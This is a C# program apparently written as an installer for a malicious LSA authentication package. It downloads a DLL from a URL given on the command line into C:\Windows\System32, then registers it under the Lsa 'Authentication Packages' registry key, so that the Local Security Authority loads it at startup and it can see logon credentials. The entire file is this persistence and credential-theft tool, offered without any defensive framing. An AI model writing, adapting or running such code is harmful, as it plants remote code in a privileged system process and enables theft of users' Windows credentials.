using System;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace install
{
    class Program
    {
        static void Main(string[] args)
        {
            string url = string.Empty;

            if (args.Length == 1)
            {
                url = args[0];
            }
            else if (args == null || args.Length == 0)
            {
                System.Environment.Exit(1);
            }

            try
            {
                File.Delete(@"c:\\windows\\system32\\package.dll");
                WebClient wc = new WebClient();
                wc.DownloadFile(url, @"c:\\windows\\system32\\package.dll");
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\\CurrentControlSet\\Control\\Lsa", true);
                key.SetValue("Authentication Packages", new string[] { "msv1_0", "package.dll" }, RegistryValueKind.MultiString);
                key.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: {0}.\n", ex.Message);
                Environment.Exit(1);
            }
        }
    }
}